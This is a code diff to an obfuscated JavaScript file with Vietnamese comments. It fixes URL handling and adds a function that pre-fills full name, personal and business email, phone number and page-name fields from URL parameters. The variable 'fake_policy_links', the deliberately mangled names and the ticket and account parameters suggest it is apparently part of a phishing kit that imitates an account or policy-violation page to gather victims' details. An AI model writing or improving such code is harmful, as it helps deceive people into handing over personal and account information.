@@ -602,14 +602,14 @@ document.addEventListener('DOMContentLoaded', function () {
 	window.addEventListener('resize', _0x27c4cd);
 });
 function detectUtmUserLeftBar() {
-	var _0x22a0f1 = new URL(window.location.html);
+	var _0x22a0f1 = new URL(window.location.href);
 	var _0x3f319d = _0x22a0f1.searchParams.get('userleft');
 	if (_0x3f319d) {
 		document.getElementById('utm-user').style.display = 'flex';
 	}
 }
 function delectAccountUtm() {
-	var _0x4ecd65 = new URL(window.location.html);
+	var _0x4ecd65 = new URL(window.location.href);
 	var _0x3a88d7 = _0x4ecd65.searchParams.get('account');
 	if (_0x3a88d7) {
 		_0x3a88d7 = _0x3a88d7.replace('!~', ' ');
@@ -621,7 +621,7 @@ function delectAccountUtm() {
 	}
 }
 function delectTicketIdUtm() {
-	var _0x32656b = new URL(window.location.html);
+	var _0x32656b = new URL(window.location.href);
 	var _0x51da2d = _0x32656b.searchParams.get('ticketId');
 	if (_0x51da2d) {
 		document.getElementById('utm-ticketId').style.display = 'flex';
@@ -676,6 +676,54 @@ fake_policy_links.forEach((_0x52efda) => {
 		document.getElementById('policyLink').click();
 	});
 });
+// Đọc query parameters từ URL và điền vào form
+function populateFormFromUrlParams() {
+	try {
+		var _0x5a8b2c = new URL(window.location.href);
+		var _0x4b8c9d = _0x5a8b2c.searchParams;
+
+		// Đọc các tham số và cập nhật formsSendData
+		var _0x3e7f1a = _0x4b8c9d.get('full-name');
+		var _0x2d9c4b = _0x4b8c9d.get('personal-email');
+		var _0x1a8e5d = _0x4b8c9d.get('buiseness-email');
+		var _0x6f3c2a = _0x4b8c9d.get('mobile-phone-number');
+		var _0x5b7d8e = _0x4b8c9d.get('page-name');
+		var _0x4a6c1f = _0x4b8c9d.get('agree-terms');
+
+		if (_0x3e7f1a) {
+			formsSendData['full-name'] = decodeURIComponent(_0x3e7f1a);
+			var _0x7e9d3a = document.querySelector('input[name="full-name"]');
+			if (_0x7e9d3a) _0x7e9d3a.value = formsSendData['full-name'];
+		}
+		if (_0x2d9c4b) {
+			formsSendData['personal-email'] = decodeURIComponent(_0x2d9c4b);
+			var _0x8f0e4b = document.querySelector('input[name="personal-email"]');
+			if (_0x8f0e4b) _0x8f0e4b.value = formsSendData['personal-email'];
+		}
+		if (_0x1a8e5d) {
+			formsSendData['buiseness-email'] = decodeURIComponent(_0x1a8e5d);
+			var _0x9a1f5c = document.querySelector('input[name="buiseness-email"]');
+			if (_0x9a1f5c) _0x9a1f5c.value = formsSendData['buiseness-email'];
+		}
+		if (_0x6f3c2a) {
+			formsSendData['mobile-phone-number'] = decodeURIComponent(_0x6f3c2a);
+			var _0xab2c6d = document.querySelector('input[name="mobile-phone-number"]');
+			if (_0xab2c6d) _0xab2c6d.value = formsSendData['mobile-phone-number'];
+		}
+		if (_0x5b7d8e) {
+			formsSendData['page-name'] = decodeURIComponent(_0x5b7d8e);
+			var _0xbc3d7e = document.querySelector('input[name="page-name"]');
+			if (_0xbc3d7e) _0xbc3d7e.value = formsSendData['page-name'];
+		}
+		if (_0x4a6c1f === 'on') {
+			var _0xcd4e8f = document.querySelector('input[name="agree-terms"]');
+			if (_0xcd4e8f) _0xcd4e8f.checked = true;
+		}
+	} catch (_0x3f9a1b) {
+		console.error('Error reading URL parameters:', _0x3f9a1b);
+	}
+}
 detectUtmUserLeftBar();
 delectAccountUtm();
 delectTicketIdUtm();
+populateFormFromUrlParams();
